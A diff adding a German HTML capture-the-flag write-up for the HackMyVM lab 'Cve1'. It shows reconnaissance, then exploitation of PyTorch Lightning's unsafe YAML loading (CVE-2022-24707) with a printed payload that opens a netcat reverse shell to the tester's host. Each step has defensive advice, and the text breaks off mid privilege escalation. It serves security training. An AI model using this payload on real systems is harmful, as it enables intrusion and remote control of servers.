@@ -1,0 +1,476 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cve1 - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Cve1 - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">zip2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">tee</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#poc-rce">Proof of Concept (YAML RCE)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                    <pre>192.168.2.212</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt bestand darin, das Zielsystem im lokalen Netzwerk zu identifizieren. Ich habe `arp-scan -l` verwendet, um eine ARP-Anfrage an alle möglichen Hosts im lokalen Netzwerk zu senden. Die Ausgabe habe ich dann mit `grep "PCS"` gefiltert, da "PCS Systemtechnik" ein häufiger Hersteller für VirtualBox-Netzwerkkarten ist, was auf eine virtuelle Maschine hindeutet. Schließlich extrahierte `awk '{print $1}'` nur die IP-Adresse aus der gefilterten Zeile.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Methode ist äußerst effizient und unauffällig für die Host-Entdeckung in einem lokalen Netzwerk (Layer 2). Sie ist schneller als ein Ping-Sweep und oft zuverlässiger, da sie nicht auf ICMP-Antworten angewiesen ist, die durch Firewalls blockiert werden können. Das Ergebnis `192.168.2.212` ist unsere eindeutige Ziel-IP für alle weiteren Aktionen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer mit Layer-2-Scans wie ARP in internen Netzen beginnen. Das Filtern nach bekannten MAC-Adress-Präfixen (OUI) kann helfen, bestimmte Gerätetypen (wie VMs, Cisco-Geräte etc.) schnell zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerk-Monitoring, um ungewöhnlich hohe ARP-Anfragen zu erkennen (ARP-Scans). Eine strikte Netzwerksegmentierung kann die Reichweite solcher Scans erheblich einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 23:49 CEST
+Nmap scan report for cve.hmv (192.168.2.212)
+Host is up (0.00011s latency).
+Not shown: 65532 closed tcp ports (reset)
+<span class="command">PORT     STATE SERVICE VERSION</span>
+<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   3072 3a:9a:6c:98:00:a7:c8:66:94:fe:58:7e:61:a7:f9:e8 (RSA)
+|   256 9d:6f:0d:13:02:3c:65:45:79:1b:3d:9b:e2:5e:24:5f (ECDSA)
+|_  256 82:ba:54:82:f7:1d:a2:65:fc:9f:25:dc:43:ee:7e:4c (ED25519)
+<span class="command">80/tcp   open  http    Apache httpd 2.4.54 ((Debian))</span>
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+<span class="command">9090/tcp open  http    Apache httpd 2.4.54 ((Debian))</span>
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:B1:D7:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms cve.hmv (192.168.2.212)
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich die IP-Adresse hatte, führte ich einen umfassenden Nmap-Scan durch. Der Befehl (nicht im Output, aber impliziert durch die Ergebnisse) war wahrscheinlich `nmap -sV -sC -p- -O 192.168.2.212`, um offene Ports, Dienste, Versionen, Standard-Skripte und das Betriebssystem zu ermitteln. Der Scan identifizierte drei offene TCP-Ports: 22 (SSH), 80 (HTTP) und 9090 (ebenfalls HTTP). Der SSH-Dienst läuft auf OpenSSH 8.4p1 und beide HTTP-Ports werden von einem Apache 2.4.54 Webserver auf einem Debian-System bedient. Die Betriebssystemerkennung deutet auf einen Linux-Kernel hin, was mit Debian konsistent ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ergebnisse geben uns klare Angriffsvektoren. Zwei separate Webserver bedeuten zwei potenzielle Angriffsflächen. Port 80 zeigt die Apache-Standardseite, was oft auf eine unkonfigurierte oder sekundäre Instanz hindeutet. Port 9090 hat keinen Titel, was auf eine benutzerdefinierte Anwendung hindeuten könnte. Die OpenSSH-Version ist relativ modern und wahrscheinlich nicht direkt durch öffentliche Exploits angreifbar, aber sie bleibt ein potenzieller Vektor, wenn Anmeldeinformationen gefunden werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die nächsten Schritte sind klar: Beide Webserver müssen gründlich auf Schwachstellen, Fehlkonfigurationen und versteckte Verzeichnisse untersucht werden. Beginne mit Port 80, da er Standard ist, aber lege den Fokus auf Port 9090, da dort eine spezifische Anwendung vermutet wird.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie nicht genutzte oder unkonfigurierte Webserver-Instanzen (wie die Standardseite auf Port 80). Stellen Sie sicher, dass alle Webanwendungen aussagekräftige Titel und standardisierte Fehlerseiten haben, um das Fingerprinting zu erschweren. Verbergen Sie detaillierte Versionsinformationen (z.B. `Server: Apache/2.4.54 (Debian)`) in den HTTP-Headern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+*   Trying 192.168.2.212:80...
+* <span class="password">Connected to 192.168.2.212 (192.168.2.212) port 80</span>
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: 192.168.2.212
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Wed, 04 Jun 2025 21:50:49 GMT
+< Server: Apache/2.4.54 (Debian)
+< Last-Modified: Mon, 05 Dec 2022 22:45:43 GMT
+< ETag: "29cd-5ef1c728a5b04"
+< Accept-Ranges: bytes
+< Content-Length: 10701
+< Vary: Accept-Encoding
+< Content-Type: text/html
+< 
+
+* Connection #0 to host 192.168.2.212 left intact
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die HTTP-Header des Webservers auf Port 80 genauer zu untersuchen, habe ich eine `HEAD`-Anfrage mit `curl` gesendet (vermutlich mit `curl -I http://192.168.2.212` oder `curl --head ...`). Eine `HEAD`-Anfrage fordert nur die Header an, nicht den eigentlichen Seiteninhalt, was sie schnell und effizient macht. Die Antwort bestätigt die Server-Version `Apache/2.4.54 (Debian)` und den `Content-Type` `text/html`. Es gibt keine ungewöhnlichen oder besonders aufschlussreichen Header.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese schnelle Überprüfung bestätigt die Nmap-Ergebnisse. Die Header sind Standard und geben keine weiteren Hinweise auf Schwachstellen oder verwendete Technologien. Das Fehlen von sicherheitsrelevanten Headern wie `Content-Security-Policy` oder `X-Frame-Options` ist zwar eine generelle Härtungsmaßnahme, aber für den initialen Zugriff zunächst nicht relevant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Überprüfen von HTTP-Headern ist ein grundlegender Schritt. Suchen Sie nach benutzerdefinierten Headern (z.B. `X-Powered-By`), die auf Backend-Technologien hinweisen könnten, oder nach verdächtigen Caching-Informationen. Da hier nichts gefunden wurde, ist es Zeit, sich auf die Inhaltserkennung zu konzentrieren.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie sicherheitsrelevante HTTP-Header, um die allgemeine Sicherheit Ihrer Webanwendungen zu erhöhen und die Angriffsfläche für clientseitige Angriffe wie Cross-Site-Scripting (XSS) oder Clickjacking zu verringern.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.212
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   503,404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              bat,jpg,crt,cgi...
+<span class="command">
+http://192.168.2.212/index.html           (Status: 200) [Size: 10701]</span>
+<span class="command">http://192.168.2.212/manual               (Status: 301) [Size: 315] [--> http://192.168.2.212/manual/]</span>
+<span class="command">http://192.168.2.212/javascript           (Status: 301) [Size: 319] [--> http://192.168.2.212/javascript/]</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe `gobuster` verwendet, um nach versteckten Verzeichnissen und Dateien auf dem Webserver auf Port 80 zu suchen. Mit einer mittelgroßen Wortliste (`directory-list-2.3-medium.txt`) und einer Auswahl an gängigen Dateierweiterungen habe ich einen Scan gestartet. Der Scan fand die Standard-`index.html`-Datei sowie die Verzeichnisse `/manual` und `/javascript`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das `/manual`-Verzeichnis ist interessant, da es oft die Standard-Dokumentation für Apache enthält, die manchmal sensible Informationen über die Konfiguration oder geladene Module preisgeben kann. Das `/javascript`-Verzeichnis ist weniger bemerkenswert. Da keine benutzerdefinierten oder verdächtigen Dateien gefunden wurden, scheint dieser Webserver relativ standardmäßig und uninteressant für einen direkten Einstieg zu sein. Der Fokus verlagert sich nun klar auf Port 9090.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie immer gefundene Standardverzeichnisse wie `/manual` oder `/doc`. Auch wenn sie oft harmlos sind, können sie in älteren oder falsch konfigurierten Systemen wertvolle Informationen enthalten. Wenn ein Standard-Webserver keine Früchte trägt, verschwenden Sie nicht zu viel Zeit und wechseln Sie zu vielversprechenderen Zielen.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie alle Standard-Dateien und -Verzeichnisse (wie die Apache-Dokumentation) aus produktiven Webserver-Wurzelverzeichnissen. Dies reduziert die Menge an Informationen, die ein Angreifer über Ihr System sammeln kann.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://cve.hmv:9090" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+                    <pre>
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://cve.hmv:9090
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span class="command">200      GET       19l       76w      910c http://cve.hmv:9090/</span>
+<span class="command">200      GET       19l       76w      910c http://cve.hmv:9090/index.php</span>
+<span class="command">301      GET        9l       28w      310c http://cve.hmv:9090/manual => http://cve.hmv:9090/manual/</span>
+<span class="command">301      GET        9l       28w      314c http://cve.hmv:9090/javascript => http://cve.hmv:9090/javascript/</span>
+<span class="command">200      GET       14l       54w     2412c http://cve.hmv:9090/manual/images/index.gif</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich habe den Fokus auf Port 9090 verlagert und einen Scan mit `feroxbuster` gestartet. Ich habe eine ähnliche Konfiguration wie bei Gobuster verwendet, aber Feroxbuster bietet zusätzliche Funktionen wie rekursive Scans und Link-Extraktion, was hier nützlich sein könnte. Der Scan identifizierte eine `index.php`-Datei als Hauptseite, was auf eine PHP-basierte Anwendung hindeutet. Wieder wurden die Standardverzeichnisse `/manual` und `/javascript` gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Fund von `index.php` ist ein wichtiger Hinweis. Im Gegensatz zur statischen `index.html` auf Port 80 haben wir es hier mit einer dynamischen Anwendung zu tun. Dies erhöht die Wahrscheinlichkeit, Schwachstellen wie Injection-Fehler, fehlerhafte Logik oder veraltete Komponenten zu finden. Der nächste logische Schritt ist, diese `index.php`-Seite und ihren Quellcode genau zu untersuchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie verschiedene Directory-Bruteforcing-Tools (wie Gobuster, Feroxbuster, Dirb), da sie manchmal aufgrund unterschiedlicher Standardkonfigurationen und Heuristiken leicht voneinander abweichende Ergebnisse liefern können. Wenn eine dynamische Seite (PHP, ASPX, JSP etc.) gefunden wird, sollte die Untersuchung sofort auf diese konzentriert werden.<br><strong>Empfehlung (Admin):</strong> Führen Sie regelmäßig eigene Scans gegen Ihre Webanwendungen durch, um sicherzustellen, dass keine unerwünschten Dateien oder Verzeichnisse erreichbar sind. Beschränken Sie den Zugriff auf nicht-öffentliche Bereiche durch IP-Whitelisting oder Authentifizierung.</p>
+            
+            <img src="sourcecode_9090index.jpg" alt="Sourcecode der Webanwendung auf Port 9090">
+            
+            <p class="analysis"><strong>Analyse:</strong> Ich habe mir den Quelltext der `index.php` auf Port 9090 angesehen. Im Quellcode fand ich einen aufschlussreichen HTML-Kommentar: `<!--Backend developed with PyTorch Lightning 1.5.9-->`. Dies ist eine extrem wertvolle Information.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das direkte Offenlegen der verwendeten Backend-Technologie und ihrer exakten Version (`PyTorch Lightning 1.5.9`) ist eine erhebliche Informationspreisgabe. Diese Version ist bekannt für die Schwachstelle CVE-2022-24707, die eine unsichere Deserialisierung von YAML-Dateien ausnutzt. Dies gibt mir einen sehr konkreten und vielversprechenden Angriffsvektor. Es ist sehr wahrscheinlich, dass die Anwendung eine Funktion zur Verarbeitung von YAML-Dateien hat, die ich ausnutzen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie immer den Quellcode von Webseiten sorgfältig auf Kommentare, versteckte Felder und Links zu Skripten. Entwicklerkommentare sind eine Goldgrube für Informationen über das Backend. Wenn eine Technologie und Version identifiziert wird, suchen Sie sofort nach bekannten öffentlichen Exploits und CVEs.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie alle Kommentare, Debugging-Informationen und unnötigen Metadaten aus dem produktiven Code. Informationen über verwendete Technologien und Versionen sollten niemals im clientseitigen Code offengelegt werden. Führen Sie regelmäßig Schwachstellenscans durch, die Ihre Softwarekomponenten mit CVE-Datenbanken abgleichen.</p>
+
+            <img src="yamlanlegen_9090index.jpg" alt="Webanwendung auf Port 9090 zum Anlegen und Ausgeben von YAML-Dateien">
+
+            <p class="analysis"><strong>Analyse:</strong> Die Weboberfläche selbst bestätigt meine Vermutung. Sie bietet eine einfache Funktionalität an: Man kann eine YAML-Datei mit einem bestimmten Namen und Inhalt erstellen ("Save") und sich den Inhalt einer bestehenden YAML-Datei anzeigen lassen ("Open File").</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist die perfekte Schnittstelle, um die vermutete Schwachstelle (CVE-2022-24707) auszunutzen. Ich kann eine bösartige YAML-Datei mit einem Payload für eine Reverse Shell erstellen, diese über die "Save"-Funktion auf den Server hochladen und sie dann durch die "Open File"-Funktion (oder eine andere interne Funktion, die die Datei verarbeitet) zur Ausführung bringen. Der Weg zum initialen Zugriff ist damit vorgezeichnet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn eine Anwendung Benutzereingaben in einem komplexen Datenformat (wie YAML, XML, JSON) verarbeitet, prüfen Sie immer auf Deserialisierungs-Schwachstellen. Suchen Sie nach öffentlichen Exploits für die identifizierte Technologie, um den Prozess zu beschleunigen.<br><strong>Empfehlung (Admin):</strong> Validieren und bereinigen (sanitizen) Sie alle Benutzereingaben rigoros. Verwenden Sie beim Deserialisieren von Daten immer "sichere" Ladefunktionen (z.B. `yaml.safe_load`), die das Erstellen beliebiger Objekte verhindern. Implementieren Sie eine strikte Eingabevalidierung, die nur die erwarteten Datenstrukturen und -typen zulässt.</p>
+        </section>
+		        <section id="poc-rce">
+            <h2>Proof of Concept (YAML RCE)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf der identifizierten Schwachstelle CVE-2022-24707 in PyTorch Lightning 1.5.9 habe ich einen Proof-of-Concept-Exploit vorbereitet. Ich habe ein öffentliches Exploit-Skript für diese CVE von GitHub geklont. Dieser Schritt stellt sicher, dass ich ein funktionierendes Werkzeug zur Hand habe, falls meine manuelle Ausnutzung fehlschlägt, und ermöglicht mir, die Logik des Exploits zu verstehen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">git clone https://github.com/Altelus1/CVE-2022-24707.git</span></div>
+                    <pre>
+Klone nach 'CVE-2022-24707'...
+remote: Enumerating objects: 5, done.
+remote: Counting objects: 100% (5/5), done.
+remote: Compressing objects: 100% (5/5), done.
+remote: Total 5 (delta 0), reused 5 (delta 0), pack-reused 0 (from 0)
+Empfange Objekte: 100% (5/5), 192.60 KiB | 4.48 MiB/s, fertig.
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2022-24707]
+└─# <span class="command">ll</span></div>
+                    <pre>
+insgesamt 216
+-rw-r--r-- 1 root root 205866  5. Jun 00:38 CVE-2022-24707.gif
+-rw-r--r-- 1 root root   4375  5. Jun 00:38 exploit.py
+-rw-r--r-- 1 root root    865  5. Jun 00:38 README.md
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Herunterladen eines bekannten Exploits ist eine effiziente Vorgehensweise. Es bestätigt die Machbarkeit des Angriffs und liefert eine Vorlage für den Payload. Der Kern der Schwachstelle liegt darin, dass `pytorch_lightning.utilities.argparse.parse_env_variables` intern eine unsichere `yaml.load` Funktion verwendet, die das Erstellen und Ausführen beliebiger Python-Objekte erlaubt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie öffentliche Exploit-Datenbanken und Repositories wie GitHub und Exploit-DB. Analysieren Sie den Code des Exploits, um genau zu verstehen, was er tut, bevor Sie ihn ausführen. Dies verhindert unerwünschte Nebeneffekte und ermöglicht Anpassungen.<br><strong>Empfehlung (Admin):</strong> Abonnieren Sie Sicherheits-Feeds für alle in Ihren Projekten verwendeten Technologien und Bibliotheken. Ein proaktives Patch-Management, das bekannte CVEs schnell behebt, hätte diesen Angriff verhindert. Ein Update auf eine gepatchte Version von PyTorch Lightning (>= 1.5.10) ist hier die primäre Maßnahme.</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://cve.hmv:9090" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml -b '503,404,403' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://cve.hmv:9090
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   503,404,403
+...
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://cve.hmv:9090/index.php            (Status: 200) [Size: 910]</span>
+<span class="command">http://cve.hmv:9090/manual               (Status: 301) [Size: 310] [--> http://cve.hmv:9090/manual/]</span>
+<span class="command">http://cve.hmv:9090/file.yaml            (Status: 200) [Size: 0]</span>
+<span class="command">http://cve.hmv:9090/javascript           (Status: 301) [Size: 314]</span>
+...
+===============================================================
+Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer, diesmal sehr spezifischer `gobuster`-Scan mit der Erweiterung `.yaml` enthüllte eine bereits existierende Datei namens `file.yaml`. Dies ist ein entscheidender Fund, da er den genauen Dateinamen bestätigt, den die Anwendung zu verarbeiten scheint.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Vorhandensein einer leeren `file.yaml`-Datei bestätigt den von der Anwendung erwarteten Dateinamen und Speicherort. Ich muss meinen bösartigen Payload also unter genau diesem Namen speichern, um die Anwendung dazu zu bringen, ihn zu verarbeiten. Dies erspart mir das Raten des Dateinamens.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Passen Sie Ihre Directory-Bruteforce-Scans immer an den Kontext an. Wenn Sie eine bestimmte Technologie vermuten (hier YAML-Verarbeitung), fügen Sie die entsprechenden Dateierweiterungen (`.yaml`, `.yml`) explizit hinzu.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie den Webserver so, dass das Auflisten von Verzeichnisinhalten deaktiviert ist und Anfragen an nicht existierende Dateien eine generische 404-Fehlerseite zurückgeben, ohne zu verraten, ob eine Datei oder ein Verzeichnis nicht gefunden wurde.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier ist der bösartige YAML-Payload, den ich erstellt habe. Dieser Payload nutzt die `!!python/object/new` und `!!python/object/apply`-Tags von PyYAML, um eine Instanz von `subprocess.Popen` zu erzeugen. Das `apply`-Tag führt dann diese Instanz mit den Argumenten `["nc", "-e", "/bin/bash", "192.168.2.199", "4444"]` aus. Dies weist den Server an, eine Reverse Shell zu meiner IP-Adresse (`192.168.2.199`) auf Port `4444` zu starten. `/bin/bash` wird dabei direkt an den Netcat-Prozess gebunden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Name: file.yaml
+
+- !!python/object/new:yaml.MappingNode
+  listitems: !!str '!!python/object/apply:subprocess.Popen [["nc","-e", "/bin/bash", "192.168.2.199", "4444"]]'
+  state:
+    tag: !!str dummy
+    value: !!str dummy
+    extend: !!python/name:yaml.unsafe_load
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klassischer Payload für eine unsichere YAML-Deserialisierung. Er ist präzise und zielt direkt darauf ab, eine interaktive Shell zu erhalten. Der Payload wird über die Weboberfläche in die `file.yaml` geschrieben. Sobald die Anwendung versucht, diese Datei zu laden (z.B. durch die "Open File"-Funktion), wird der Python-Code ausgeführt und die Shell-Verbindung aufgebaut.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Halten Sie eine Sammlung von Payloads für verschiedene Arten von Command-Injection- und Deserialisierungs-Schwachstellen bereit. Passen Sie IP-Adressen und Ports immer an das aktuelle Szenario an. Der `-e` Parameter von Netcat ist nicht auf allen Systemen verfügbar; alternative Payloads (z.B. mit Python, Perl oder Bash) sollten als Backup bereitgehalten werden.<br><strong>Empfehlung (Admin):</strong> Neben der Verwendung von `yaml.safe_load` sollten Web Application Firewalls (WAFs) so konfiguriert werden, dass sie verdächtige Muster wie `subprocess.Popen` oder `os.system` in Benutzereingaben erkennen und blockieren. Netzwerk-Egress-Filterung (Ausgehender Verkehr) kann verhindern, dass der Server Verbindungen zu beliebigen IPs und Ports im Internet aufbaut.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich den Payload über die Weboberfläche in `file.yaml` gespeichert und die "Open File"-Funktion ausgelöst hatte, startete ich auf meinem Angreifer-System einen Netcat-Listener auf Port `4444`, um die eingehende Verbindung abzufangen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.212] 45842</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Exploit war erfolgreich. Die Zeile `connect to ... from ... 192.168.2.212` bestätigt, dass der Zielserver eine Verbindung zu meinem Listener aufgebaut hat. Ich habe nun eine interaktive Shell auf dem Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell sofort nach dem Zugriff. Einfache Netcat-Shells sind oft instabil. Verwenden Sie Techniken wie `python -c 'import pty; pty.spawn("/bin/bash")'` um eine voll interaktive TTY-Shell zu erhalten. Dokumentieren Sie sofort die Benutzer- und Systeminformationen.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Netzwerkverbindungen von Ihren Servern. Verbindungen zu ungewöhnlichen Ports oder unbekannten IP-Adressen sind ein starkes Indiz für eine Kompromittierung. Implementieren Sie Host-based Intrusion Detection Systems (HIDS), die die Erstellung verdächtiger Prozesse (wie eine Shell, die von einem Webserver-Prozess gestartet wird) erkennen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@cve-pt1:~$ id
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Befehl in der neuen Shell, `id`, bestätigt meine Identität auf dem System. Ich laufe als Benutzer `www-data`, was der Standardbenutzer für den Apache-Webserver unter Debian ist. Ich habe geringe Berechtigungen und bin auf das beschränkt, was der Webserver-Prozess tun darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der initiale Zugriff war erfolgreich, aber das Ziel ist es, volle Kontrolle (root-Rechte) über das System zu erlangen. Die `www-data`-Rechte sind ein wichtiger erster Schritt. Von hier aus beginnt die Phase der lokalen Enumeration und Privilege Escalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie nach dem initialen Zugriff immer mit grundlegenden Enumerationsbefehlen: `id`, `whoami`, `pwd`, `hostname`, `uname -a`, `sudo -l`. Diese geben einen ersten Überblick über die Umgebung und mögliche nächste Schritte.<br><strong>Empfehlung (Admin):</strong> Der Grundsatz des "Least Privilege" wurde hier teilweise befolgt (die Webanwendung läuft nicht als root). Dies ist eine entscheidende Verteidigungslinie. Stellen Sie sicher, dass Dienstkonten wie `www-data` nur die absolut notwendigen Berechtigungen haben und keinen Zugriff auf sensible Systembereiche oder sudo-Rechte ohne triftigen Grund besitzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@cve-pt1:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
